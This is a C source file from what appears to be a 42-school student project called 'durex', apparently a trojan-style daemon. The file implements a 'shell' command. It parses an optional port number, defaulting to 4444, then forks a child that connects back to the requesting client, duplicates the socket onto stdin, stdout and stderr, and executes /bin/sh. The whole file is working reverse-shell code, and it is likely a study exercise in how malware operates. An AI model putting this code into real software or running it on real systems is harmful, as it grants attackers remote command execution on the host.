/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex_revshell.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/15 10:19:12 by user42            #+#    #+#             */
/*   Updated: 2022/02/15 10:21:03 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

int		check_port(t_server *server)
{
	char	digits[6];
	int		i, j, k, port;

	if (server->buff[5] == '\n' || server->buff[5] == '\0')
		return (0);
	if (server->buff[5] != ' ')
		return (-1);
	
	i = 6;
	k = 0;
	while (server->buff[i] >= 48 && server->buff[i] <= 57)
	{
		k++;
		i++;
	}
	if ((server->buff[i] != '\n' && server->buff[i] != '\0') || k == 0 || k > 5)
		return (-1);
	j = 0;
	i = 6;
	while (j < k)
	{
		digits[j] = server->buff[i + j];
		j++;
	}
	digits[j] = '\0';

	port = atoi(digits);
	if (port <= 0 || port > 65535)
		return (-1);
	return (port);
}

void	spawn_shell(t_server *server, t_client *client)
{
	int						port;
	char					msg[128];
	bzero(msg, 128);

	port = check_port(server);
	if (port == 0)
	{
		send_info(server, client->fd, "[*] Using default port 4444\n");
		port = 4444;
	}
	if (port == -1)
	{
		send_info(server, client->fd, "[!] Usage: shell [port (optional)]\n$> ");
		return ;
	}

	printf("[LOG] Client %d requested reverse shell on %s:%d.\n", client->id, inet_ntoa((client->sockaddr).sin_addr), port);
	sprintf(msg, "[*] Spawning your reverse shell on %s:%d...\n", inet_ntoa((client->sockaddr).sin_addr), port);
	send_info(server, client->fd, msg);

	pid_t					pid;

	pid = fork();
	if (pid == -1)
		fatal(server);
	else if (pid == 0)
	{
		struct sockaddr_in		sa;
		int						s;
		char					*const args[] = {"/bin/sh", 0};

		sa.sin_family = AF_INET;
		sa.sin_addr.s_addr = (client->sockaddr).sin_addr.s_addr;
		sa.sin_port = htons(port);

		s = socket(AF_INET, SOCK_STREAM, 0);
		if ((connect(s, (struct sockaddr *)&sa, sizeof(sa))) == -1)
		{
			send_info(server, client->fd, "[!] Couldn't open reverse shell.\n$> ");
			printf("[LOG] Couldn't open shell for client %d.\n", client->id);
			exit(1);
		}
		send_info(server, client->fd, "[+] Reverse shell connection successfull.\n$> ");
		printf("[LOG] Successfully opened shell for client %d.\n", client->id);
		dup2(s, 0);
		dup2(s, 1);
		dup2(s, 2);

		execve("/bin/sh", args, 0);
	}
	else
		return ;
}
